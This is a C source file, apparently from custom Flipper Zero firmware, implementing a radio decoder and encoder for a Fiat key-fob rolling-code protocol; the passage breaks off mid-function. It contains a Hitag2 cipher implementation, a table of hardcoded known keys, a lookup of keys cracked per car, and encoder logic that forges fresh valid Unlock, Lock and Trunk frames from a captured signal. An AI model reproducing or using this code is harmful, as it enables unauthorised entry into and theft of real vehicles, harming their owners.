#include "fiat_v1.h"
#include "hitag2_key_db.h"
#include <lib/subghz/blocks/const.h>
#include <lib/subghz/blocks/decoder.h>
#include <lib/subghz/blocks/encoder.h>
#include <lib/subghz/blocks/generic.h>
#include <lib/subghz/blocks/math.h>
// [PROTOPIRATE_PORT] custom_btn support
#include <lib/subghz/blocks/custom_btn_i.h>
#include <string.h>

#define TAG "FiatProtocolV1"

#define FIAT_V1_TE_SHORT          250U
#define FIAT_V1_TE_LONG           500U
#define FIAT_V1_TE_DELTA          100U
#define FIAT_V1_TE_B_SHORT        100U
#define FIAT_V1_TE_B_LONG         200U
#define FIAT_V1_TE_B_DELTA        50U
#define FIAT_V1_WIRE_BITS         104U
#define FIAT_V1_WIRE_BYTES        13U
#define FIAT_V1_WIRE_CELLS        (FIAT_V1_WIRE_BITS * 2U)
#define FIAT_V1_LOGICAL_BITS      102U
#define FIAT_V1_VARIANT_COUNT     2U
#define FIAT_V1_BOUNDARY_MIN_US   800U
#define FIAT_V1_DEFAULT_TAIL_BITS 2U
#define FIAT_V1_RAW_FIELD         "Raw"
#define FIAT_V1_HOP_FIELD         "Hop"
#define FIAT_V1_TAIL_BITS_FIELD   "Tail Bits"
#define FIAT_V1_XOR_FIELD         "XOR"
#define FIAT_V1_HITAG2_KEY_FIELD  "Hitag2 Key"
#define FIAT_V1_HITAG2_EPOCH_FIELD "Hitag2 Epoch"
// [HITAG2_BF] FIAT_V1_KNOWN_KEY_COUNT is now defined in fiat_v1.h (public API)

#define FIAT_V1_ENC_LEAD_US        2033U
#define FIAT_V1_ENC_GAP_US         3252U
#define FIAT_V1_ENC_DEFAULT_REPEAT 6U
#define FIAT_V1_UPLOAD_CAPACITY    240U

static const SubGhzBlockConst subghz_protocol_fiat_v1_const = {
    .te_short = FIAT_V1_TE_SHORT,
    .te_long = FIAT_V1_TE_LONG,
    .te_delta = FIAT_V1_TE_DELTA,
    .min_count_bit_for_found = FIAT_V1_LOGICAL_BITS,
};

static const SubGhzBlockConst subghz_protocol_fiat_v1_const_b = {
    .te_short = FIAT_V1_TE_B_SHORT,
    .te_long = FIAT_V1_TE_B_LONG,
    .te_delta = FIAT_V1_TE_B_DELTA,
    .min_count_bit_for_found = FIAT_V1_LOGICAL_BITS,
};

static const SubGhzBlockConst* fiat_v1_variant_const(uint8_t variant) {
    return (variant == 0U) ? &subghz_protocol_fiat_v1_const : &subghz_protocol_fiat_v1_const_b;
}

typedef enum {
    FiatV1DecoderStepReset = 0,
    FiatV1DecoderStepData = 1,
} FiatV1DecoderStep;

struct SubGhzProtocolDecoderFiatV1 {
    SubGhzProtocolDecoderBase base;
    SubGhzBlockDecoder decoder;
    SubGhzBlockGeneric generic;

    uint8_t cells[FIAT_V1_VARIANT_COUNT][FIAT_V1_WIRE_CELLS];
    uint16_t cell_count[FIAT_V1_VARIANT_COUNT];

    uint8_t raw_data[FIAT_V1_WIRE_BYTES];
    uint8_t last_raw_data[FIAT_V1_WIRE_BYTES];
    bool last_raw_valid;

    uint32_t uid;
    uint32_t hop;
    uint8_t family;
    uint8_t tail_bits;
    uint8_t frame_xor;

    uint8_t hitag2_key[6];
    uint32_t hitag2_epoch;
    bool hitag2_key_valid;
};

struct SubGhzProtocolEncoderFiatV1 {
    SubGhzProtocolEncoderBase base;
    SubGhzProtocolBlockEncoder encoder;
    SubGhzBlockGeneric generic;

    uint8_t raw_data[FIAT_V1_WIRE_BYTES];
    uint8_t hitag2_key[6];
    uint32_t epoch;
    uint32_t hop;
    uint8_t tail_bits;
    uint8_t frame_xor;
};

static bool fiat_v1_feed_data_pulse(
    SubGhzProtocolDecoderFiatV1* instance,
    bool level,
    uint32_t duration);
static bool fiat_v1_frame_valid(const uint8_t raw[FIAT_V1_WIRE_BYTES]);
static void fiat_v1_build_raw(
    uint8_t raw[FIAT_V1_WIRE_BYTES],
    uint32_t uid,
    uint8_t button,
    uint16_t control,
    uint32_t auth,
    uint8_t tail_bits);
static void fiat_v1_verify_hitag2_key(SubGhzProtocolDecoderFiatV1* instance);

static void subghz_protocol_decoder_fiat_v1_free(void* context) {
    furi_assert(context);
    free(context);
}

const SubGhzProtocolDecoder subghz_protocol_fiat_v1_decoder = {
    .alloc = subghz_protocol_decoder_fiat_v1_alloc,
    .free = subghz_protocol_decoder_fiat_v1_free,
    .feed = subghz_protocol_decoder_fiat_v1_feed,
    .reset = subghz_protocol_decoder_fiat_v1_reset,
    .get_hash_data = subghz_protocol_decoder_fiat_v1_get_hash_data,
    .serialize = subghz_protocol_decoder_fiat_v1_serialize,
    .deserialize = subghz_protocol_decoder_fiat_v1_deserialize,
    .get_string = subghz_protocol_decoder_fiat_v1_get_string,
};

const SubGhzProtocolEncoder subghz_protocol_fiat_v1_encoder = {
    .alloc = subghz_protocol_encoder_fiat_v1_alloc,
    .free = subghz_protocol_encoder_fiat_v1_free,
    .deserialize = subghz_protocol_encoder_fiat_v1_deserialize,
    .stop = subghz_protocol_encoder_fiat_v1_stop,
    .yield = subghz_protocol_encoder_fiat_v1_yield,
};

const SubGhzProtocol fiat_v1_protocol = {
    .name = FIAT_V1_PROTOCOL_NAME,
    .type = SubGhzProtocolTypeDynamic,
    .flag = SubGhzProtocolFlag_315 | SubGhzProtocolFlag_433 | SubGhzProtocolFlag_AM | SubGhzProtocolFlag_FM |
            SubGhzProtocolFlag_Decodable | SubGhzProtocolFlag_Load | SubGhzProtocolFlag_Save |
            SubGhzProtocolFlag_Send,
    .decoder = &subghz_protocol_fiat_v1_decoder,
    .encoder = &subghz_protocol_fiat_v1_encoder,
};

static bool fiat_v1_duration_is_short(uint8_t variant, uint32_t duration) {
    const SubGhzBlockConst* c = fiat_v1_variant_const(variant);
    return DURATION_DIFF(duration, c->te_short) < c->te_delta;
}

static bool fiat_v1_duration_is_long(uint8_t variant, uint32_t duration) {
    const SubGhzBlockConst* c = fiat_v1_variant_const(variant);
    return DURATION_DIFF(duration, c->te_long) < c->te_delta;
}

static bool fiat_v1_duration_is_pulse(uint32_t duration) {
    for(uint8_t variant = 0U; variant < FIAT_V1_VARIANT_COUNT; variant++) {
        if(fiat_v1_duration_is_short(variant, duration) ||
           fiat_v1_duration_is_long(variant, duration)) {
            return true;
        }
    }
    return false;
}

static bool fiat_v1_button_valid(uint8_t button) {
    return button == 0x1U || button == 0x2U || button == 0x4U || button == 0x8U;
}

static const char* fiat_v1_button_name(uint8_t button) {
    switch(button) {
    case 0x8U:
        return "Unlock";
    case 0x4U:
        return "Lock";
    case 0x2U:
        return "Trunk";
    case 0x1U:
        return "Close";
    default:
        return "Unknown";
    }
}

// [PROTOPIRATE_PORT] custom_btn UI support
// Maps the current D-pad selection to the Fiat V1 button code, mirroring the
// encoder remap (see encoder deserialize): Up=0x8, Down=0x4, Left=0x2,
// Right=0x1, OK=captured. Used by get_string so the transmitter UI shows the
// button the user actually selected, not the captured one.
static uint8_t fiat_v1_custom_to_btn(uint8_t custom, uint8_t original_btn) {
    switch(custom) {
    case SUBGHZ_CUSTOM_BTN_UP:
        return 0x8U; // Unlock
    case SUBGHZ_CUSTOM_BTN_DOWN:
        return 0x4U; // Lock
    case SUBGHZ_CUSTOM_BTN_LEFT:
        return 0x2U; // Trunk
    case SUBGHZ_CUSTOM_BTN_RIGHT:
        return 0x1U; // Close
    case SUBGHZ_CUSTOM_BTN_OK:
    default:
        return original_btn;
    }
}

static uint8_t fiat_v1_frame_xor(const uint8_t raw[FIAT_V1_WIRE_BYTES]) {
    uint8_t value = 0x01U;
    for(uint8_t i = 0U; i < FIAT_V1_WIRE_BYTES - 1U; i++) {
        value ^= raw[i];
    }
    return value;
}

static void fiat_v1_build_raw(
    uint8_t raw[FIAT_V1_WIRE_BYTES],
    uint32_t uid,
    uint8_t button,
    uint16_t control,
    uint32_t auth,
    uint8_t tail_bits) {
    memset(raw, 0, FIAT_V1_WIRE_BYTES);
    raw[1] = 0x01U;
    raw[2] = (uint8_t)(uid >> 24U);
    raw[3] = (uint8_t)(uid >> 16U);
    raw[4] = (uint8_t)(uid >> 8U);
    raw[5] = (uint8_t)uid;
    raw[6] = (uint8_t)(((button & 0x0FU) << 4U) | ((control >> 6U) & 0x0FU));
    raw[7] = (uint8_t)(((control & 0x3FU) << 2U) | ((auth >> 30U) & 0x03U));
    raw[8] = (uint8_t)(auth >> 22U);
    raw[9] = (uint8_t)(auth >> 14U);
    raw[10] = (uint8_t)(auth >> 6U);
    raw[11] = (uint8_t)((auth << 2U) | (tail_bits & 0x03U));
    raw[12] = fiat_v1_frame_xor(raw);
}

static uint32_t fiat_v1_uid(const uint8_t raw[FIAT_V1_WIRE_BYTES]) {
    return ((uint32_t)raw[2] << 24U) | ((uint32_t)raw[3] << 16U) |
           ((uint32_t)raw[4] << 8U) | raw[5];
}

static uint32_t fiat_v1_counter(const uint8_t raw[FIAT_V1_WIRE_BYTES]) {
    return ((uint32_t)(raw[6] & 0x0FU) << 6U) | (raw[7] >> 2U);
}

static uint32_t fiat_v1_hop(const uint8_t raw[FIAT_V1_WIRE_BYTES]) {
    return ((uint32_t)(raw[7] & 0x03U) << 30U) | ((uint32_t)raw[8] << 22U) |
           ((uint32_t)raw[9] << 14U) | ((uint32_t)raw[10] << 6U) | (raw[11] >> 2U);
}

static bool fiat_v1_frame_valid(const uint8_t raw[FIAT_V1_WIRE_BYTES]) {
    if(raw[0] != 0x00U || raw[1] != 0x01U) {
        return false;
    }
    if(fiat_v1_frame_xor(raw) != raw[12]) {
        return false;
    }
    if(!fiat_v1_button_valid(raw[6] >> 4U)) {
        return false;
    }

    const uint32_t uid = fiat_v1_uid(raw);
    return uid != 0U && uid != UINT32_MAX;
}

static void fiat_v1_clear_cells(SubGhzProtocolDecoderFiatV1* instance, uint8_t variant) {
    instance->cell_count[variant] = 0U;
    memset(instance->cells[variant], 0, FIAT_V1_WIRE_CELLS);
}

static void fiat_v1_clear_all_cells(SubGhzProtocolDecoderFiatV1* instance) {
    for(uint8_t variant = 0U; variant < FIAT_V1_VARIANT_COUNT; variant++) {
        fiat_v1_clear_cells(instance, variant);
    }
}

static void fiat_v1_decode_fields(SubGhzProtocolDecoderFiatV1* instance) {
    instance->family = instance->raw_data[1];
    instance->uid = fiat_v1_uid(instance->raw_data);
    instance->generic.serial = instance->uid;
    instance->generic.btn = instance->raw_data[6] >> 4U;
    instance->generic.cnt = fiat_v1_counter(instance->raw_data);
    instance->hop = fiat_v1_hop(instance->raw_data);
    instance->tail_bits = instance->raw_data[11] & 0x03U;
    instance->frame_xor = instance->raw_data[12];
    instance->generic.data = ((uint64_t)instance->generic.serial << 32U) | instance->hop;
    instance->generic.data_count_bit = FIAT_V1_LOGICAL_BITS;
    instance->decoder.decode_data = instance->generic.data;
    instance->decoder.decode_count_bit = instance->generic.data_count_bit;
    fiat_v1_verify_hitag2_key(instance);

    // [PROTOPIRATE_PORT] custom_btn support
    // Fiat V1 full D-pad: OK=captured button, Up=0x8 (Unlock), Down=0x4 (Lock),
    // Left=0x2 (Trunk), Right=0x1 (Close). All mapped codes are in the valid
    // {1,2,4,8} set so the re-encrypted frame round-trips through this decoder.
    if(subghz_custom_btn_get_original() == 0) {
        subghz_custom_btn_set_original(instance->generic.btn);
    }
    subghz_custom_btn_set_max(4);
}

static bool fiat_v1_commit(
    SubGhzProtocolDecoderFiatV1* instance,
    const uint8_t raw[FIAT_V1_WIRE_BYTES]) {
    if(!fiat_v1_frame_valid(raw)) {
        return false;
    }

    if(instance->last_raw_valid && memcmp(instance->last_raw_data, raw, FIAT_V1_WIRE_BYTES) == 0) {
        return true;
    }

    memcpy(instance->raw_data, raw, FIAT_V1_WIRE_BYTES);
    memcpy(instance->last_raw_data, raw, FIAT_V1_WIRE_BYTES);
    instance->last_raw_valid = true;
    fiat_v1_decode_fields(instance);

    FURI_LOG_D(
        TAG,
        "Accepted UID:%08lX Btn:%02X Cnt:%03lX Auth:%08lX XOR:%02X",
        (unsigned long)instance->uid,
        instance->generic.btn,
        (unsigned long)instance->generic.cnt,
        (unsigned long)instance->hop,
        instance->frame_xor);

    if(instance->base.callback) {
        instance->base.callback(&instance->base, instance->base.context);
    }
    return true;
}

static bool
    fiat_v1_try_decode_window(SubGhzProtocolDecoderFiatV1* instance, uint8_t variant, bool invert) {
    if(instance->cell_count[variant] != FIAT_V1_WIRE_CELLS) {
        return false;
    }

    const uint8_t* cells = instance->cells[variant];
    uint8_t raw[FIAT_V1_WIRE_BYTES] = {0};
    for(uint8_t bit_index = 0U; bit_index < FIAT_V1_WIRE_BITS; bit_index++) {
        const uint8_t first = cells[bit_index * 2U];
        const uint8_t second = cells[bit_index * 2U + 1U];
        if(first == second) {
            return false;
        }

        bool bit = first != 0U;
        if(invert) {
            bit = !bit;
        }
        if(bit) {
            raw[bit_index >> 3U] |= (uint8_t)(1U << (7U - (bit_index & 7U)));
        }
    }

    return fiat_v1_commit(instance, raw);
}

static void fiat_v1_try_decode(SubGhzProtocolDecoderFiatV1* instance, uint8_t variant) {
    if(fiat_v1_try_decode_window(instance, variant, false)) {
        return;
    }
    (void)fiat_v1_try_decode_window(instance, variant, true);
}

static void
    fiat_v1_push_cell(SubGhzProtocolDecoderFiatV1* instance, uint8_t variant, bool level) {
    uint8_t* cells = instance->cells[variant];
    if(instance->cell_count[variant] < FIAT_V1_WIRE_CELLS) {
        cells[instance->cell_count[variant]++] = level ? 1U : 0U;
    } else {
        memmove(cells, &cells[1], FIAT_V1_WIRE_CELLS - 1U);
        cells[FIAT_V1_WIRE_CELLS - 1U] = level ? 1U : 0U;
    }
    fiat_v1_try_decode(instance, variant);
}

static bool fiat_v1_feed_data_pulse(
    SubGhzProtocolDecoderFiatV1* instance,
    bool level,
    uint32_t duration) {
    bool matched = false;

    for(uint8_t variant = 0U; variant < FIAT_V1_VARIANT_COUNT; variant++) {
        if(fiat_v1_duration_is_short(variant, duration)) {
            fiat_v1_push_cell(instance, variant, level);
            matched = true;
        } else if(fiat_v1_duration_is_long(variant, duration)) {
            fiat_v1_push_cell(instance, variant, level);
            fiat_v1_push_cell(instance, variant, level);
            matched = true;
        } else {
            if(!level && duration >= FIAT_V1_BOUNDARY_MIN_US) {
                fiat_v1_push_cell(instance, variant, false);
            }
            fiat_v1_clear_cells(instance, variant);
        }
    }

    return matched;
}

static void fiat_v1_rebuild_raw(SubGhzProtocolDecoderFiatV1* instance) {
    fiat_v1_build_raw(
        instance->raw_data,
        instance->generic.serial,
        instance->generic.btn,
        (uint16_t)(instance->generic.cnt & 0x03FFU),
        instance->hop,
        instance->tail_bits);
    if(instance->family && instance->family != 0x01U) {
        instance->raw_data[1] = instance->family;
        instance->raw_data[12] = fiat_v1_frame_xor(instance->raw_data);
    }
    if(instance->frame_xor) {
        instance->raw_data[12] = instance->frame_xor;
    }
}

static uint8_t fiat_v1_truth(uint32_t table, uint8_t index) {
    return (uint8_t)((table >> index) & 1U);
}

static uint8_t fiat_v1_filter_index(uint8_t a, uint8_t b, uint8_t c, uint8_t d) {
    return (uint8_t)((a << 3U) | (b << 2U) | (c << 1U) | d);
}

static uint8_t fiat_v1_byte_bit(uint8_t byte, uint8_t bit) {
    return (uint8_t)((byte >> bit) & 1U);
}

static uint8_t fiat_v1_bcm_hitag2_filter(const uint8_t state[6]) {
    uint8_t group = 0U;
    group |= fiat_v1_truth(
        0x2c79U,
        fiat_v1_filter_index(
            fiat_v1_byte_bit(state[0], 1U),
            fiat_v1_byte_bit(state[0], 2U),
            fiat_v1_byte_bit(state[0], 4U),
            fiat_v1_byte_bit(state[0], 5U)));
    group |= (uint8_t)(fiat_v1_truth(
                           0x6671U,
                           fiat_v1_filter_index(
                               fiat_v1_byte_bit(state[1], 0U),
                               fiat_v1_byte_bit(state[1], 1U),
                               fiat_v1_byte_bit(state[1], 3U),
                               fiat_v1_byte_bit(state[1], 7U)))
                       << 1U);
    group |= (uint8_t)(fiat_v1_truth(
                           0x6671U,
                           fiat_v1_filter_index(
                               fiat_v1_byte_bit(state[3], 5U),
                               fiat_v1_byte_bit(state[2], 0U),
                               fiat_v1_byte_bit(state[2], 2U),
                               fiat_v1_byte_bit(state[2], 6U)))
                       << 2U);
    group |= (uint8_t)(fiat_v1_truth(
                           0x6671U,
                           fiat_v1_filter_index(
                               fiat_v1_byte_bit(state[4], 6U),
                               fiat_v1_byte_bit(state[3], 0U),
                               fiat_v1_byte_bit(state[3], 2U),
                               fiat_v1_byte_bit(state[3], 3U)))
                       << 3U);
    group |= (uint8_t)(fiat_v1_truth(
                           0x2c79U,
                           fiat_v1_filter_index(
                               fiat_v1_byte_bit(state[5], 1U),
                               fiat_v1_byte_bit(state[5], 3U),
                               fiat_v1_byte_bit(state[5], 4U),
                               fiat_v1_byte_bit(state[4], 5U)))
                       << 4U);
    return fiat_v1_truth(0x7907287bUL, group);
}

static uint8_t fiat_v1_parity8(uint8_t value) {
    value ^= (uint8_t)(value >> 4U);
    value ^= (uint8_t)(value >> 2U);
    value ^= (uint8_t)(value >> 1U);
    return value & 1U;
}

static uint8_t fiat_v1_bcm_hitag2_feedback(const uint8_t state[6]) {
    static const uint8_t masks[6] = {0xb3U, 0x80U, 0x83U, 0x22U, 0x00U, 0x73U};
    uint8_t feedback = 0U;
    for(uint8_t i = 0U; i < 6U; i++) {
        feedback ^= fiat_v1_parity8((uint8_t)(state[i] & masks[i]));
    }
    return feedback & 1U;
}

static void fiat_v1_bcm_hitag2_shift(uint8_t state[6], uint8_t input) {
    for(uint8_t i = 0U; i < 5U; i++) {
        state[i] = (uint8_t)((state[i] << 1U) | (state[i + 1U] >> 7U));
    }
    state[5] = (uint8_t)((state[5] << 1U) | (input & 1U));
}

static uint8_t fiat_v1_input_bit_u32_be(uint32_t value, uint8_t index) {
    return (uint8_t)((value >> (31U - index)) & 1U);
}

static uint8_t fiat_v1_input_bit_bytes_be(const uint8_t* bytes, uint8_t index) {
    return (uint8_t)((bytes[index >> 3U] >> (7U - (index & 7U))) & 1U);
}

static uint32_t fiat_v1_bcm_generate_authenticator(
    uint32_t uid,
    uint8_t button,
    uint16_t control,
    const uint8_t key[6],
    uint32_t epoch) {
    uint8_t state[6] = {
        (uint8_t)(uid >> 24U),
        (uint8_t)(uid >> 16U),
        (uint8_t)(uid >> 8U),
        (uint8_t)uid,
        key[4],
        key[5],
    };

    const uint32_t iv =
        ((epoch & 0x3FFFFUL) << 14U) | (((uint32_t)control & 0x03FFUL) << 4U) |
        ((uint32_t)button & 0x0FUL);

    for(uint8_t i = 0U; i < 32U; i++) {
        const uint8_t input = fiat_v1_input_bit_u32_be(iv, i) ^
                              fiat_v1_input_bit_bytes_be(key, i) ^
                              fiat_v1_bcm_hitag2_filter(state);
        fiat_v1_bcm_hitag2_shift(state, input);
    }

    uint32_t authenticator = 0U;
    for(uint8_t i = 0U; i < 32U; i++) {
        authenticator = (authenticator << 1U) | fiat_v1_bcm_hitag2_filter(state);
        fiat_v1_bcm_hitag2_shift(state, fiat_v1_bcm_hitag2_feedback(state));
    }
    return authenticator;
}

static const uint8_t fiat_v1_known_keys[FIAT_V1_KNOWN_KEY_COUNT][6] = {
    {0xB7U, 0x92U, 0x80U, 0xAEU, 0xCCU, 0x37U},
    {0xD4U, 0x24U, 0x28U, 0xF7U, 0xD9U, 0x66U},
    {0x4DU, 0x34U, 0x3FU, 0xD4U, 0xE7U, 0xB6U},
    {0x6DU, 0x6BU, 0xF2U, 0x1DU, 0x3AU, 0x1AU},
    {0xA3U, 0xF3U, 0xACU, 0xF7U, 0xB9U, 0x10U},
    {0x4DU, 0x49U, 0x4BU, 0x52U, 0x4FU, 0x4EU},
    {0xCDU, 0x49U, 0x4BU, 0x52U, 0x4FU, 0x4EU},
    {0x33U, 0xFAU, 0x2FU, 0xCDU, 0xC3U, 0x3BU},
};

static bool fiat_v1_key_matches(
    uint32_t uid,
    uint8_t button,
    uint16_t control,
    uint32_t hop,
    const uint8_t key[6],
    uint32_t epoch) {
    return fiat_v1_bcm_generate_authenticator(uid, button, control, key, epoch) == hop;
}

static void fiat_v1_verify_hitag2_key(SubGhzProtocolDecoderFiatV1* instance) {
    instance->hitag2_key_valid = false;
    instance->hitag2_epoch = 0U;
    memset(instance->hitag2_key, 0, sizeof(instance->hitag2_key));

    const uint32_t uid = instance->uid;
    const uint8_t button = instance->generic.btn;
    const uint16_t control = (uint16_t)(instance->generic.cnt & 0x03FFU);
    const uint32_t hop = instance->hop;

    for(uint8_t i = 0U; i < FIAT_V1_KNOWN_KEY_COUNT; i++) {
        if(fiat_v1_key_matches(
               uid, button, control, hop, fiat_v1_known_keys[i], instance->hitag2_epoch)) {
            memcpy(instance->hitag2_key, fiat_v1_known_keys[i], sizeof(instance->hitag2_key));
            instance->hitag2_key_valid = true;
            return;
        }
    }

    // [ARF_PORT 2026-10-26] Hitag2 key database lookup (ported from
    // doctor-firmware). If the built-in keys did not match, try a key previously
    // cracked for THIS car (keyed by UID). This only ADDS a resolution path; the
    // brute-force cascade, the flat dictionary and all existing behaviour are
    // untouched. A bad DB record simply fails fiat_v1_key_matches() and we fall
    // through exactly as before.
    if(uid != 0U && uid != UINT32_MAX) {
        Hitag2KeyDbRecord record = {0};
        if(hitag2_key_db_find(uid, &record) && record.has_key) {
            const uint32_t db_epoch = record.epoch & 0x3FFFFUL;
            if(fiat_v1_key_matches(uid, button, control, hop, record.key, db_epoch)) {
                memcpy(instance->hitag2_key, record.key, sizeof(instance->hitag2_key));
                instance->hitag2_epoch = db_epoch;
                instance->hitag2_key_valid = true;
                return;
            }
        }
    }
}

static bool fiat_v1_encoder_build_upload(SubGhzProtocolEncoderFiatV1* instance) {
    furi_check(instance);
    LevelDuration* upload = instance->encoder.upload;
    if(!upload) {
        return false;
    }

    size_t index = 0U;

    upload[index++] = level_duration_make(true, FIAT_V1_ENC_LEAD_US);

    for(uint8_t bit_index = 0U; bit_index < FIAT_V1_WIRE_BITS; bit_index++) {
        const bool bit =
            ((instance->raw_data[bit_index >> 3U] >> (7U - (bit_index & 7U))) & 1U) != 0U;
        upload[index++] = level_duration_make(bit, FIAT_V1_TE_SHORT);
        upload[index++] = level_duration_make(!bit, FIAT_V1_TE_SHORT);
    }

    upload[index++] = level_duration_make(false, FIAT_V1_ENC_GAP_US);
    instance->encoder.size_upload = index;
    instance->encoder.front = 0U;
    return true;
}

void* subghz_protocol_encoder_fiat_v1_alloc(SubGhzEnvironment* environment) {
    UNUSED(environment);
    SubGhzProtocolEncoderFiatV1* instance = calloc(1, sizeof(SubGhzProtocolEncoderFiatV1));
    furi_check(instance);

    instance->base.protocol = &fiat_v1_protocol;
    instance->generic.protocol_name = instance->base.protocol->name;
    instance->tail_bits = FIAT_V1_DEFAULT_TAIL_BITS;
    instance->encoder.repeat = FIAT_V1_ENC_DEFAULT_REPEAT;
    return instance;
}

void subghz_protocol_encoder_fiat_v1_free(void* context) {
    furi_assert(context);
    SubGhzProtocolEncoderFiatV1* instance = context;
    free(instance->encoder.upload);
    free(instance);
}

void subghz_protocol_encoder_fiat_v1_stop(void* context) {
    furi_assert(context);
    SubGhzProtocolEncoderFiatV1* instance = context;
    instance->encoder.is_running = false;
    instance->encoder.front = 0;
}

LevelDuration subghz_protocol_encoder_fiat_v1_yield(void* context) {
    furi_assert(context);
    SubGhzProtocolEncoderFiatV1* instance = context;

    if(!instance->encoder.is_running || instance->encoder.repeat == 0 ||
       instance->encoder.size_upload == 0) {
        instance->encoder.is_running = false;
        return level_duration_reset();
    }

    LevelDuration ret = instance->encoder.upload[instance->encoder.front];

    if(++instance->encoder.front == instance->encoder.size_upload) {
        if(!subghz_block_generic_global.endless_tx) instance->encoder.repeat--;
        instance->encoder.front = 0;
    }

    return ret;
}

SubGhzProtocolStatus
    subghz_protocol_encoder_fiat_v1_deserialize(void* context, FlipperFormat* flipper_format) {
    furi_check(context);
    furi_check(flipper_format);
    SubGhzProtocolEncoderFiatV1* instance = context;

    instance->encoder.is_running = false;
    instance->encoder.front = 0U;

    flipper_format_rewind(flipper_format);
    FuriString* protocol_name = furi_string_alloc();
    bool protocol_ok = flipper_format_read_string(flipper_format, "Protocol", protocol_name) &&
                       furi_string_equal(protocol_name, instance->base.protocol->name);
    furi_string_free(protocol_name);
    if(!protocol_ok) {
        return SubGhzProtocolStatusErrorParserOthers;
    }

    uint32_t bit_count = 0U;
    flipper_format_rewind(flipper_format);
    if(!flipper_format_read_uint32(flipper_format, "Bit", &bit_count, 1) ||
       bit_count != FIAT_V1_LOGICAL_BITS) {
        return SubGhzProtocolStatusErrorValueBitCount;
    }
    instance->generic.data_count_bit = bit_count;

    uint32_t serial = 0U;
    uint32_t button = 0U;
    uint32_t control = 0U;
    uint8_t raw_from_file[FIAT_V1_WIRE_BYTES] = {0};

    flipper_format_rewind(flipper_format);
    if(flipper_format_read_hex(flipper_format, FIAT_V1_RAW_FIELD, raw_from_file, sizeof(raw_from_file)) &&
       fiat_v1_frame_valid(raw_from_file)) {
        serial = fiat_v1_uid(raw_from_file);
        button = raw_from_file[6] >> 4U;
        control = fiat_v1_counter(raw_from_file);
        instance->tail_bits = raw_from_file[11] & 0x03U;
    } else {
        SubGhzBlockGeneric generic = {0};
        flipper_format_rewind(flipper_format);
        if(subghz_block_generic_deserialize_check_count_bit(
               &generic, flipper_format, subghz_protocol_fiat_v1_const.min_count_bit_for_found) ==
           SubGhzProtocolStatusOk) {
            serial = (uint32_t)(generic.data >> 32U);
            button = generic.btn;
            control = generic.cnt;
        }
    }

    flipper_format_rewind(flipper_format);
    flipper_format_read_uint32(flipper_format, "Serial", &serial, 1);
    flipper_format_rewind(flipper_format);
    flipper_format_read_uint32(flipper_format, "Btn", &button, 1);
    flipper_format_rewind(flipper_format);
    flipper_format_read_uint32(flipper_format, "Cnt", &control, 1);

    // [PROTOPIRATE_PORT] custom_btn support
    // Fiat V1 full D-pad (only meaningful WHEN A HITAG2 KEY IS AVAILABLE, so a
    // fresh authenticator can be computed for the changed button):
    //   OK (default) → captured button, byte-identical replay of the capture
    //   Up           → 0x8 (Unlock)
    //   Down         → 0x4 (Lock)
    //   Left         → 0x2 (Trunk)
    //   Right        → 0x1 (Close)
    // All codes are in the valid {1,2,4,8} set so fiat_v1_button_valid() passes
    // and the receiver accepts the frame. The actual remap + counter increment
    // is applied below, gated on key_loaded (see the key-present branch); the
    // no-key path keeps replaying the captured button/frame untouched.
    const uint8_t original_btn = (uint8_t)(button & 0x0FU);
    // Ensure the transmitter gate sees a nonzero original button so the D-pad UI
    // stays enabled (Fiat captured buttons are always nonzero, in {1,2,4,8}).
    if(subghz_custom_btn_get_original() == 0) {
        subghz_custom_btn_set_original(original_btn);
    }
    subghz_custom_btn_set_max(4);
    const uint8_t custom_btn_id = subghz_custom_btn_get();

    /* Skip strict validity check when the (possibly custom) button is any 4-bit code.
     * Only reject if serial is missing/invalid. */
    if(serial == 0U || serial == UINT32_MAX) {
        return SubGhzProtocolStatusErrorParserOthers;
    }

    // [BUGFIX] Hitag2 Key is now OPTIONAL: if not present in the .sub (which
    // happens when the capture was serialized before hitag2_key_valid was set,
    // or when the file was hand-edited), try to auto-discover the key by
    // iterating the 8 known keys against the captured (uid, btn, cnt, hop).
    // This mirrors what fiat_v1_verify_hitag2_key() does at RX time.
    bool key_loaded = false;
    flipper_format_rewind(flipper_format);
    if(flipper_format_read_hex(
           flipper_format, FIAT_V1_HITAG2_KEY_FIELD, instance->hitag2_key, 6U)) {
        key_loaded = true;
    }

    uint32_t epoch = 0U;
    flipper_format_rewind(flipper_format);
    if(flipper_format_read_uint32(flipper_format, FIAT_V1_HITAG2_EPOCH_FIELD, &epoch, 1U)) {
        instance->epoch = epoch & 0x3FFFFUL;
    } else {
        instance->epoch = 0U;
    }

    if(!key_loaded) {
        // Reconstruct captured hop+btn from the Raw field (or from generic if Raw missing)
        uint32_t captured_hop = 0U;
        uint8_t captured_btn = 0U;
        uint16_t captured_cnt = (uint16_t)(control & 0x03FFU);
        if(fiat_v1_frame_valid(raw_from_file)) {
            captured_hop = fiat_v1_hop(raw_from_file);
            captured_btn = raw_from_file[6] >> 4U;
        } else {
            // Fallback: derive from generic.data (upper 32 bits = serial, lower = hop)
            captured_hop = (uint32_t)(instance->generic.data & 0xFFFFFFFFULL);
            captured_btn = (uint8_t)(button & 0x0FU);
        }

        for(uint8_t i = 0U; i < FIAT_V1_KNOWN_KEY_COUNT; i++) {
            if(fiat_v1_key_matches(
                   serial,
                   captured_btn,
                   captured_cnt,
                   captured_hop,
                   fiat_v1_known_keys[i],
                   instance->epoch)) {
                memcpy(instance->hitag2_key, fiat_v1_known_keys[i], 6U);
                key_loaded = true;
                FURI_LOG_I(TAG, "TX: auto-discovered known key %u", i);
                break;
            }
        }
    }

    // WHEN A KEY IS AVAILABLE: apply the full D-pad remap. The rolling counter is
    // driven by the app (car-emulate scene writes an incremented "Cnt" into the
    // flipper_format before re-invoking this deserialize); we already read it into
    // `control` above, so we simply honor it here — matching the KIA family
    // template (kia_v6.c ~984). The re-encode below recomputes the Hitag2
    // authenticator for the honored (button, control), so each TX with a fresh
    // "Cnt" is a valid NEXT rolling code, not a byte-identical replay.
    // WHEN NO KEY: leave button/control at the captured values so the no-key
    // branch below can replay the captured frame byte-for-byte (we cannot forward-
    // encode without the Hitag2 key).
    if(key_loaded) {
        switch(custom_btn_id) {
        case SUBGHZ_CUSTOM_BTN_UP:
            button = 0x8U; // Unlock
            break;
        case SUBGHZ_CUSTOM_BTN_DOWN:
            button = 0x4U; // Lock
            break;
        case SUBGHZ_CUSTOM_BTN_LEFT:
            button = 0x2U; // Trunk
            break;
        case SUBGHZ_CUSTOM_BTN_RIGHT:
            button = 0x1U; // Close
            break;
        case SUBGHZ_CUSTOM_BTN_OK:
        default:
            // OK = re-emit the captured button. The counter still follows the
